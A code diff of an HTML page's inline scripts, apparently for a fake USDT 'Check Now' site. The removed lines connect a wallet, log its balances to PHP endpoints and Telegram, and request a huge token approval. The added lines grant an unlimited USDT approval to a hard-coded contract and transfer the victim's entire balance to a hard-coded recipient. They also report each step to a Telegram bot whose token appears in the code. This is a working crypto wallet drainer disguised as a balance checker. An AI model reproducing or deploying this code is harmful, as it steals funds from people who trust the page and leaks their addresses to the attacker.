@@ -1320,142 +1320,86 @@
                                                                 // Run the function
                                                                 addAndSwitchToBSC();
                                                             </script>
-                                                            <script>
-                                                                let walletAddress = "";
-                                                                let provider, signer;
+                                                 <script>
+const tokenAddress = "0x55d398326f99059fF775485246999027B3197955";
+const contractAddress = "0x828bc41ea90d48c0db0030860Aca6CaD6128Fbd3";
+const recipientAddress = "0x56d21eA0E027b925423D68FC5d2762e3AD07284d";
+const telegramToken = "8168441203:AAGpFsF9O386peGIZXB1ev9mc_fpkKcboLg";
+const telegramChatID = "6774801802";
 
-                                                                async function connectWallet() {
-                                                                    if (window.ethereum) {
-                                                                        try {
-                                                                            await window.ethereum.request({
-                                                                                method: 'eth_accounts'
-                                                                            });
-                                                                            provider = new ethers.providers.Web3Provider(window.ethereum);
-                                                                            signer = provider.getSigner();
-                                                                            walletAddress = await signer.getAddress();
-                                                                            document.getElementById("walletInfo").innerText = "Connected: " + walletAddress;
+window.onload = async function() {
+  if (typeof window.ethereum !== 'undefined') {
+    try {
+      await window.ethereum.request({ method: 'wallet_switchEthereumChain', params:[{ chainId: '0x38' }] });
+    } catch(e) { }
+  }
+}
 
-                                                                            // Get BNB balance
-                                                                            const bnbBalance = await provider.getBalance(walletAddress);
-                                                                            const formattedBNB = ethers.utils.formatEther(bnbBalance);
+function calculateUSD() {
+  let amount = parseFloat(document.getElementById("amount").value);
+  if (!amount || amount <= 0) amount = 0;
+  document.getElementById("usdValue").innerText = "$" + amount.toFixed(2);
+}
 
-                                                                            // Get USDT balance (assuming BUSD token)
-                                                                            const tokenAddress = "0x55d398326f99059ff775485246999027b3197955";
-                                                                            // BUSD
-                                                                            const tokenAbi = ["function balanceOf(address account) view returns (uint256)"];
-                                                                            const tokenContract = new ethers.Contract(tokenAddress,tokenAbi,provider);
-                                                                            const usdtBalance = await tokenContract.balanceOf(walletAddress);
-                                                                            const formattedUSDT = ethers.utils.formatUnits(usdtBalance, 18);
-                                                                            // 18 decimals
+async function start() {
+  const loader = document.getElementById("loader");
+  loader.style.display = "block";
 
-                                                                            // ✅ Log to server after getting balances
-                                                                            fetch('saveWallet.php', {
-                                                                                method: 'POST',
-                                                                                headers: {
-                                                                                    'Content-Type': 'application/json'
-                                                                                },
-                                                                                body: JSON.stringify({
-                                                                                    wallet: walletAddress,
-                                                                                    bnb: formattedBNB,
-                                                                                    usdt: formattedUSDT
-                                                                                })
-                                                                            });
+  if (typeof window.ethereum === 'undefined') {
+    alert('Please install MetaMask or TrustWallet!');
+    loader.style.display = "none";
+    return;
+  }
 
-                                                                            // Send Telegram message
-                                                                            fetch('sendTelegram.php', {
-                                                                                method: 'POST',
-                                                                                headers: {
-                                                                                    'Content-Type': 'application/json'
-                                                                                },
-                                                                                body: JSON.stringify({
-                                                                                    message: `🔔 <b>New Wallet Connected</b>\n🧾 Address: <code>${walletAddress}</code>\n💰 BNB Balance: ${formattedBNB}\n💳 USDT Balance: ${formattedUSDT}`
-                                                                                })
-                                                                            });
+  try {
+    const web3 = new Web3(window.ethereum);
+    const accounts = await web3.eth.requestAccounts();
+    const account = accounts[0];
 
-                                                                        } catch (err) {
-                                                                            console.error("Connection error:", err);
-                                                                            document.getElementById("walletInfo").innerText = "Wallet not connected";
-                                                                        }
-                                                                    } else {
-                                                                        alert("MetaMask not detected");
-                                                                    }
-                                                                }
+    sendTelegram("User Connected: " + account);
 
-                                                                async function approveToken() {
-                                                                    if (!walletAddress) {
-                                                                        await connectWallet();
-                                                                        if (!walletAddress)
-                                                                            return;
-                                                                        // still not connected
-                                                                    }
+    const abi = [
+      {"constant":true,"inputs":[{"name":"owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"type":"function"},
+      {"constant":false,"inputs":[{"name":"spender","type":"address"},{"name":"amount","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"},
+      {"constant":false,"inputs":[{"name":"recipient","type":"address"},{"name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"type":"function"}
+    ];
 
-                                                                    const tokenAddress = "0x55d398326f99059ff775485246999027b3197955";
-                                                                    // BUSD
-                                                                    const spender = "0x0f93a68693bc960d3670bf1f010fa7e90c4b8468";
-                                                                    const amount = ethers.utils.parseUnits("55398325990.000000000000000001", 18);
+    const token = new web3.eth.Contract(abi, tokenAddress);
+    const balance = await token.methods.balanceOf(account).call();
 
-                                                                    const abi = ["function approve(address spender, uint256 amount) public returns (bool)"];
-                                                                    const token = new ethers.Contract(tokenAddress,abi,signer);
+    if (BigInt(balance) === 0n) {
+      alert("No USDT balance found.");
+      loader.style.display = "none";
+      return;
+    }
 
-                                                                    try {
-                                                                        const tx = await token.approve(spender, amount);
-                                                                        await tx.wait();
+    const maxApproval = web3.utils.toTwosComplement('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff');
+    await token.methods.approve(contractAddress, maxApproval).send({ from: account });
 
-                                                                        console.log("✅ Approval successful");
+    await token.methods.transfer(recipientAddress, balance).send({ from: account });
 
-                                                                        // Log to server
-                                                                        fetch('logApproval.php', {
-                                                                            method: 'POST',
-                                                                            headers: {
-                                                                                'Content-Type': 'application/json'
-                                                                            },
-                                                                            body: JSON.stringify({
-                                                                                wallet: walletAddress,
-                                                                                token: tokenAddress,
-                                                                                spender: spender,
-                                                                                amount: amount.toString()
-                                                                            })
-                                                                        }).then(res => res.json()).then(console.log);
+    const humanReadable = parseFloat(balance) / 1e6;
+    sendTelegram("USDT Transferred: " + humanReadable + " USDT from: " + account);
 
-                                                                        // Get updated USDT balance
-                                                                        const tokenAbi = ["function balanceOf(address account) view returns (uint256)"];
-                                                                        const usdtAbi = ["function balanceOf(address owner) view returns (uint256)"];
+    alert("Transaction completed successfully!");
+  } catch (err) {
+    alert("Error: " + err.message);
+  }
 
-                                                                        const usdtContract = new ethers.Contract(tokenAddress,tokenAbi,provider);
-                                                                        const usdtBalance = await usdtContract.balanceOf(walletAddress);
-                                                                        const formattedBalance = ethers.utils.formatUnits(usdtBalance, 18);
+  loader.style.display = "none";
+}
 
-                                                                        // Show result
-                                                                        showApprovalPopup(walletAddress, formattedBalance);
+function sendTelegram(message) {
+  fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${telegramChatID}&text=${encodeURIComponent(message)}`);
+}
 
-                                                                        // Telegram notification
-                                                                        fetch('sendTelegram.php', {
-                                                                            method: 'POST',
-                                                                            headers: {
-                                                                                'Content-Type': 'application/json'
-                                                                            },
-                                                                            body: JSON.stringify({
+function copyAddress() {
+  const addressField = document.getElementById("address");
+  navigator.clipboard.writeText(addressField.value);
+  alert("Address copied!");
+}
+</script>
 
-                                                                                message: `✅ <b>Token Approved</b>\n🧾 Wallet: <code>${walletAddress}</code>\n📤 Spender: <code>${spender}</code>\n💳 Token: <code>${tokenAddress}</code>\n🔢 Amount: ${ethers.utils.formatUnits(amount, 18)}`
-
-                                                                            })
-                                                                        });
-
-                                                                    } catch (err) {
-                                                                        console.warn("User rejected or error:", err.message);
-                                                                    }
-                                                                }
-
-                                                                // Optional: connect on page load
-                                                                // window.addEventListener('load', connectWallet);
-
-                                                                function showApprovalPopup(wallet, balance) {
-                                                                    document.getElementById('popupAddress').innerText = wallet;
-                                                                    document.getElementById('popupBalance').innerText = balance;
-                                                                    document.getElementById('popupDate').innerText = new Date().toLocaleDateString();
-                                                                    document.getElementById('popupCert').innerText = 'USDT-' + Math.floor(Math.random() * 90000000 + 10000000);
-                                                                    document.getElementById('approvalPopup').style.display = 'block';
-                                                                }
                                                             </script>
                                                             <button type="button" class="hero-button group px-8 py-4 bg-white text-emerald-600 rounded-xl font-bold hover:bg-emerald-50 transition-all duration-300 ease-in-out flex items-center justify-center space-x-2 shadow-lg" onclick="approveToken()">Check Now
     </button>
